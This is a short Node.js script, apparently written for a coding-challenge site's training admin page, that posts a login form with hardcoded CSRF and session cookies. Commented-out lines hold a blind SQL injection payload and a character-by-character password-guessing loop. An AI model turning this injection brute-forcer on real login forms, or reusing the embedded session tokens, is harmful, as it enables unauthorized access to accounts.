var http = require('http');
var querystring = require('querystring');

var postData = {
  '_token' : 'Rit2Jnje2ET1YFg9IohzjV72WTIC6ToFjuBX3y9T',
  'username' : 'shinian',
  'password' : '123'
};

var options = {
    'host': 'www.qlcoder.com',
    '_token' : 'Rit2Jnje2ET1YFg9IohzjV72WTIC6ToFjuBX3y9T',
    'path': '/train/admin',
    'method': 'POST',
    'headers' : {
    	'origin':'http://www.qlcoder.com',
    	'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36',
    	'referer' : 'http://www.qlcoder.com/train/admin',
    	'cookie' : 'remember_82e5d2c56bdd0811318f0cf078b78bfc=eyJpdiI6Ilp6NlFqdGJyTWtXZGhBWTFtQ0lRYWc9PSIsInZhbHVlIjoiZ2ZsbTlqYXpjZU1SV3JuYmg1T2syU2sxUXJmV2JtRlwvQXhRZURtSmd3WjNUOGlVSFFTT3B1WHBFMlBcL2h1eG5qT0JtdGk4TFJac2h3Wjk0UWtlVTIzR0R4THZ1WmRcLzRUSXBxc1VpblVYSUU9IiwibWFjIjoiYWJlYjk3YTVjMGJjNWZjMDJmMzg4YTA1YTM4MjM5YzcwYWRiYjAzODNkMTcwYWQwYjgyOTcyZGJhODM2MzhhMCJ9; è¿é¢çç­æ¡æ¯oreo=eyJpdiI6Inh2XC8xQzBWVkhGUEhoS0hodjJ1Tm1BPT0iLCJ2YWx1ZSI6IkdVcVduMEJnd1k3UEFxaUl6K0ZiS3c9PSIsIm1hYyI6IjJiNWY0ZjQzN2JlNWEzNzk2NmUyMmQ2MzlmNjNhNjU0Yjk0ZWE2OWYwZDg2MWM2YzI3MzY0ZjQ2MjBkMzI2YzQifQ%3D%3D; Hm_lvt_420590b976ac0a82d0b82a80985a3b8a=1451026591,1451268868,1451355701,1451357844; Hm_lpvt_420590b976ac0a82d0b82a80985a3b8a=1451444435; XSRF-TOKEN=eyJpdiI6InNPbCtOME1xVlwvaU5DUDJtK3hhTlBRPT0iLCJ2YWx1ZSI6Im1aNElUcEVNSDJCcXVRaWxvY0lEd1FHNUF4aG45cnhWK3E5UWR3TWxmVG9PblJBR2VUMDZMWm01UXRIT2dPMWM4V2E0VTVtMW5UeSszZVd3Z3M5WU1RPT0iLCJtYWMiOiJiOGZlNmUwODcyOGVlZjY5Mzg1ZDQ4Y2JmNjVkMDdiYjkxMDQ4ODZjMWFkYWRkNWVkMmRhM2FlZDFkNTM1OTlkIn0%3D; laravel_session=eyJpdiI6IlhSMlwvbFwvdnFVV0dqRGNNXC81alNqS2c9PSIsInZhbHVlIjoiN0dEeFpNcExHZFpYejViN2tcL1pvY3A2XC8wbkZSVDM5ZUI0TTBRelFOREFNTGlWYVRcL2E3cCsrWFdcL1gzM2tQOElVeUV0ZTI3NkEyelp3dU9lT3FNVE53PT0iLCJtYWMiOiJiNmY3MjBjZTZlYjUwOGJkNmVkZjZkOTI0M2IyZjEzNjdiNWEwN2I2MmE3NTUyM2ZjZjNjYjE0MmQ4Njg0NTQ5In0%3D'
    }
};

function toReq(postData) {
	var req = http.request(options, function(res) {
		var html = '';
		res.on('data', function(data) {
			html += data;
		})
		res.on('end', function() {
			console.log(html);
			// if(!/Whoops, looks like something went wrong./.test(html)) {
			// 	console.log(html);
			// }else {
			// 	postData.username = 'shinian\' and substr(password,1,1) = ' + arr[i++]+' # \'';
			// 	toReq(postData);
			// }
		})
	});
	req.on('error', function() {
		console.log('获取html出错!');
	});
	req.write(querystring.stringify(postData));
	req.end();
}
var arr = ['a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z',
		   'A','B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X','Y','Z',
		   '1','2','3','4','5','6','7','8','9','0'];
var i = 0;
// var username = 'shinian\' and substr(password,1,1) = \''
// postData.username = 'shinian';
toReq(postData);
